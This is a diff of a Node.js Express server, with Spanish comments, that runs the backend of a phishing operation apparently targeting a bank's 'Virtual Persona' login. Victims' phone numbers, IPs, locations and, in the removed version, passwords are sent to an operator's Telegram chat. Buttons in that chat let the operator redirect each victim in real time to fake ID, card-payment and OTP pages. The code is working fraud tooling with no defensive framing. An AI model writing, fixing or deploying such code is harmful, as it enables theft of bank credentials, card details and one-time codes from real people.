@@ -1,145 +1,100 @@
-// ✅ server.js corregido con botones funcionales y webhook funcionando correctamente
+// ✅ server.js completamente funcional para Render sin dependencias externas innecesarias
 
-import express from "express";
-import bodyParser from "body-parser";
-// Ya no necesitas importar nada. Borra la línea de importación de 'node-fetch'
-import dotenv from "dotenv";
-import cors from "cors";
-import { v4 as uuidv4 } from "uuid";
+import express from 'express';
+import bodyParser from 'body-parser';
+import fetch from 'node-fetch';
+import dotenv from 'dotenv';
+import crypto from 'crypto';
 
 dotenv.config();
 
 const app = express();
 const port = process.env.PORT || 3000;
 
-const BOT_TOKEN = process.env.BOT_TOKEN;
-const CHAT_ID = process.env.CHAT_ID;
-const PUBLIC_BASE_URL = process.env.PUBLIC_BASE_URL || "https://servidor-trico.onrender.com";
-const TG_API = `https://api.telegram.org/bot${BOT_TOKEN}`;
-
-const sessionMap = new Map();
-
-app.use(cors());
 app.use(bodyParser.json());
 app.use(bodyParser.urlencoded({ extended: true }));
 
-// ✅ FUNCIONES UTILES
-function buttonsForStep(step, sessionId) {
-  if (step === "virtual") {
-    return {
-      inline_keyboard: [
-        [
-          { text: "🔁 Error Logo", callback_data: `error_logo_${sessionId}` },
-          { text: "🔁 Error OTP", callback_data: `error_otp_${sessionId}` }
-        ],
-        [
-          { text: "✅ Siguiente", callback_data: `siguiente_${sessionId}` }
-        ]
-      ]
-    };
-  }
-  return {};
+// Sesiones en memoria
+const sessionState = new Map();
+
+// Función para generar ID único sin 'uuid'
+function generateSessionId() {
+  return crypto.randomUUID();
 }
 
-async function tgSendMessage(text, reply_markup = null) {
-  await fetch(`${TG_API}/sendMessage`, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
+// Ruta principal que inicia flujo (ej: /virtualpersona)
+app.post('/virtualpersona', async (req, res) => {
+  const { numero, ip, location } = req.body;
+
+  const sessionId = generateSessionId();
+  sessionState.set(sessionId, { estado: 'esperando', redirect_to: null });
+
+  const message = `🔔 NUEVA SESIÓN
+📱 Número: ${numero}
+📍 IP: ${ip}
+🌍 Ubicación: ${location}
+🆔 SessionID: ${sessionId}`;
+  const botones = {
+    inline_keyboard: [
+      [
+        { text: "🔁 Error Logo", callback_data: `redirect:${sessionId}:id-check.html` },
+        { text: "🔁 Error Tarjeta", callback_data: `redirect:${sessionId}:payment.html` },
+        { text: "✅ Siguiente", callback_data: `redirect:${sessionId}:otp-check.html` }
+      ]
+    ]
+  };
+
+  await fetch(`https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendMessage`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify({
-      chat_id: CHAT_ID,
-      text,
-      ...(reply_markup && { reply_markup })
+      chat_id: process.env.CHAT_ID,
+      text: message,
+      reply_markup: botones
     })
   });
-}
 
-// ✅ ENDPOINT PRINCIPAL /virtualpersona
-app.post("/virtualpersona", async (req, res) => {
-  const { numero, clave, ip, location } = req.body;
-  const sessionId = uuidv4();
-  sessionMap.set(sessionId, { status: "pending" });
-
-  const message = `🔐 *Nuevo acceso virtual:*
-
-📱 Número: ${numero}
-🔑 Clave: ${clave}
-🌐 IP: ${ip}
-📍 Ubicación: ${location}
-🆔 ID: ${sessionId}`;
-
-  await tgSendMessage(message, buttonsForStep("virtual", sessionId));
   res.json({ sessionId });
 });
 
-// ✅ ENDPOINT polling desde loading.html
-app.get("/instruction/:sessionId", (req, res) => {
-  const sessionId = req.params.sessionId;
-  const session = sessionMap.get(sessionId);
+// Ruta que el frontend consulta para saber redirección
+app.get('/instruction/:sessionId', (req, res) => {
+  const { sessionId } = req.params;
+  const estado = sessionState.get(sessionId);
 
-  if (!session || !session.redirect_to) {
-    return res.json({});
-  }
-  res.json({ redirect_to: session.redirect_to });
+  if (!estado) return res.status(404).json({ error: "Session not found" });
+
+  res.json(estado);
 });
 
-// ✅ ENDPOINT para setear webhook automáticamente
-app.get("/set-webhook", async (req, res) => {
-  const url = `${PUBLIC_BASE_URL}/telegram/webhook`;
-  const response = await fetch(`${TG_API}/setWebhook`, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ url })
-  });
+// Webhook de botones de Telegram
+app.post('/telegram/webhook', async (req, res) => {
+  const { callback_query } = req.body;
 
-  const data = await response.json();
-  res.json(data);
-});
+  if (!callback_query?.data) return res.sendStatus(200);
 
-// ✅ ENDPOINT para recibir respuestas de botones (webhook de Telegram)
-app.post("/telegram/webhook", async (req, res) => {
-  const body = req.body;
+  const [type, sessionId, redirect_to] = callback_query.data.split(':');
 
-  if (!body.callback_query) {
-    return res.sendStatus(200);
+  if (type === 'redirect' && sessionState.has(sessionId)) {
+    sessionState.set(sessionId, { estado: 'redirigiendo', redirect_to });
   }
 
-  const data = body.callback_query.data;
-  const callbackId = body.callback_query.id;
-  const chatId = body.callback_query.message.chat.id;
+  const chatId = callback_query.message.chat.id;
+  const messageId = callback_query.message.message_id;
 
-  const [accion, , sessionId] = data.split("_");
-
-  let redirectPath;
-  switch (accion) {
-    case "error":
-      if (data.includes("logo")) redirectPath = "/Virtual-Persona.html";
-      if (data.includes("otp")) redirectPath = "/otp-check.html";
-      break;
-    case "siguiente":
-      redirectPath = "/otp-check.html";
-      break;
-  }
-
-  if (redirectPath && sessionMap.has(sessionId)) {
-    sessionMap.set(sessionId, { redirect_to: redirectPath });
-  }
-
-  // ✅ Responder a Telegram correctamente (corrección crítica)
-  await fetch(`${TG_API}/answerCallbackQuery`, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
+  await fetch(`https://api.telegram.org/bot${process.env.BOT_TOKEN}/editMessageReplyMarkup`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify({
-      callback_query_id: callbackId,
-      text: "✅ Acción recibida.",
-      show_alert: false
+      chat_id: chatId,
+      message_id: messageId,
+      reply_markup: { inline_keyboard: [] }
     })
   });
 
   res.sendStatus(200);
 });
 
-// ✅ Servidor activo
 app.listen(port, () => {
-  console.log(`🚀 Servidor en http://localhost:${port}`);
+  console.log(`Servidor en línea en puerto ${port}`);
 });
-
